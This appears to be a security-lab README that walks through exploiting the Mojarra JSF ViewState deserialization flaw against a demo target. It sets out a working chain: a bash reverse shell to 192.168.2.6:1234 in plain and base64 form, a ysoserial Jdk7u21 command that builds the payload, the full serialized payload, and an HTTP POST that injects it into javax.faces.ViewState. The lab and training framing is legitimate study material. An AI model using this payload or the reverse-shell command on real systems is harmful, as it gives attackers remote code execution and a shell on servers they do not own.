# Mojarra JSF ViewState Deserialization Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability Name** | Mojarra JSF ViewState Deserialization |
| **Affected Versions** | Mojarra < 2.1.29-08 / < 2.0.11-04 |
| **Vulnerability Type** | Deserialization Remote Code Execution |
| **Severity** | 🔴 High |
| **Default Port** | 8080 |

## Description

**JavaServer Faces (JSF)** is a standard for building **Web** application user interfaces, and **Mojarra** is a framework that implements **JSF**. In versions prior to 2.1.29-08 and 2.0.11-04, the **ViewState** in JSF was not encrypted, allowing attackers to craft malicious serialized **ViewState** objects to attack the server.

## Exploitation

After the target machine starts, access `http://your-ip:8080` to view the **demo** page:

![demo page](https://static.nextcyber.cn/attachments/images/course/task/31efa1c0d979489598da50007f6256f5.png)

The target is a **JSF** application using **JDK7u21** and **mojarra 2.1.28**. The JSF ViewState structure is as follows:

![ViewState structure](https://static.nextcyber.cn/attachments/images/course/task/b0f9ecdd0f944c32b8ff834fd34b3400.png)

Based on this structure, we use the **Jdk7u21** gadget chain from [ysoserial](https://github.com/frohoff/ysoserial) to generate a valid **Payload**:

```
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=

java -jar ysoserial-all.jar Jdk7u21 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" | gzip | base64 -w 0
```

```
┌──(root㉿nextcyber)-[~]
└─# java -jar ysoserial-all.jar Jdk7u21 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" | gzip | base64 -w 0
H4sIAAAAAAAAA61WzW8TRxR/Yye24xryAUn4KGAKlBCS3XwSU6cFkxAwdQjCJgisKh2vh3jDenfZnU02ULj1D6gq+A/aHkoPXAriUAn1Br1UqtSKCqm99Nb2gCr10o83u5s4IikxlJV2Z/Z9zZv3fvPm3f4VGm0LOufoPJUcrmpSTtUvs/JJalfyjP+gfX/x5pPunSEA14LWmlTAvz/+4c1b9+4OhZFvLiQAoOXIURBPCK2+pRhVyXZ0ybBmJWpSpcIkl2pUl1SdM0unmuTaGlckblFXKrCqqVHO7CyOTeenHui3Px8MQyQLG2ZUvcx0ftqplpiVhY0zqKDbGuNZpLtFiM+UFjlTjDKzOYSLxWNFiMwoGrXxt62YE27LuOysPCZo6Rw0zui0ypC5gpfnlqrPIrN1xnC46fAzlmEyi6vCaIcvKPYu1+hp1xR7/Qcfx/IWfvevre2zsz+OiIAJXgjpoeKx2087/4zECj8F5MjTh3/f/wrZA3A4DmF4IwojUdgXhTcJtNjMUqk2zSxbNfRz2XEC5BSBDWOGbnOq82mqOazxi+THTz968vs7BCKjqq5ynIS7DkwTaBjDKBBoxjQyP14FWtKQ0pYzFDRL0Tj+B8QGXlFtApvy3CkVgpieoYuaQcsEElldZ5YXMoZCw7lF2/Cdk01fxvYDcoKWZxm3965hJU2gyUvWJcOqErC6cogJGTEhIyZkHxOyhwl5CROyhwl5fGoyXVxTuqrVZH1/1KvMkvPBlHKM20mqlzVmpUVIYmVDcaqIHwK9L7Q8qlZ8O7j9Y//fGQLx467CTEGzo7CfwKcvFo91PSjzqjxemMy4qp1FEuWGtb5SXTFUA3MCBy/jBYFoEEsCmVcRybzhWAqbUAWMEwECJXFIExCH16LQRWDwJQBL4Gi9GbEcnatVJmdKNkJc4UuWCGz2ioVq1Jz3Ttvhei0vWVpGC4Fd6+wFUzSqaEEpaK1VtbO+k1HoxpihYPBPoL3rQG6VWDoBPdAbh4MgEXivhEU+2askrzGlYvRcqE5cpWMZTvOZg6fUzPzFE9MDucGzc8pYyp0qZJ3JwoWh3FzWOa2m3Mm5yb7sOMrNHX/7+gfX0BA7NNTTW/bnlZ5e9XoM+rD+MJcpBPZ3ra7DK73DiqswLNwJLJiDwrshLIh5TpXLk9QMStnOWoDOLGDd6u8f7h/pH0kNDAyNDPalCCRzz5dIw24IYTFGr/DdBo0QwTEqijjEPBriCr/ilpNxJDg2dt8FcscT2YDfiEeUYSN+E74ANEMKR6yxsBmlhPIRfMOC9qzikKeY9JmBopi1Q4fHJ9AJW1BjK859H4XZ7YHZrEddw2zKM9vtM9c0+zrsQA0x2wm7cPnaAjE4sLzpvcgRUs2fQZjk7oHc1v8lDJ+/4yke8jZFhETSW383tOIYR1YI9kALNDlX4AbaAvLd8uW3XVx+7VHojMKWKGyt9/K78ov622j1xJZXc/mFJwxj1WW3b93LDrXqKUPbCOypwxRuvQb3qdIcU/67jKxXCp6LY1I/jkefwXGbx9/kfTevyG6HyK7JoQFPlWUuEHDt6y4mdgj/XQkru7TcA9TaPHep7RR7lix2ScNNS3jU3cWf9z9OftMy9igEJAekwjEdtegEknJWn8ekrrwVXBObzgHRcC5Zo7pucE9GyixPVymee/hHc/ujG5+EIJSDRJUJ4HhIw8aveUXjh8UG28MGvmhi69i6qq30ln+mR0aVxujjB193vP8tHo0JiIt0TeBlYWAf28QrFrMrhlZ2zaBtTizERBMtwschdmmYDtNDfSlxcmLuvLVORKH2uKb7L/z+bAfbCwAA
```

## Reverse Shell

Capture the request, modify the **javax.faces.ViewState** parameter content to the payload, and perform URL encoding to obtain a reverse shell.

> You can select the payload, right-click **burp → Convert selection → URL → URL-encode key characters** to perform URL encoding.

```
POST /index.xhtml HTTP/1.1
Host: 10.14.245.132:8080
Content-Length: 1968
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.14.245.132:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.14.245.132:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=1b6spzc4mfjy72j5k70jylfxx
Connection: close

j_idt6=j_idt6&j_idt6%3Aj_idt7=1&j_idt6%3Aj_idt8=Hello&javax.faces.ViewState=payload
```

![Reverse shell](https://static.nextcyber.cn/attachments/images/course/task/a7c153cae47c4ec3a5248f2ae1757952.png)
---

## Lab Practice

Practice this vulnerability on [NextCyber Lab](https://app.nextcyber.cn/courses/114).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
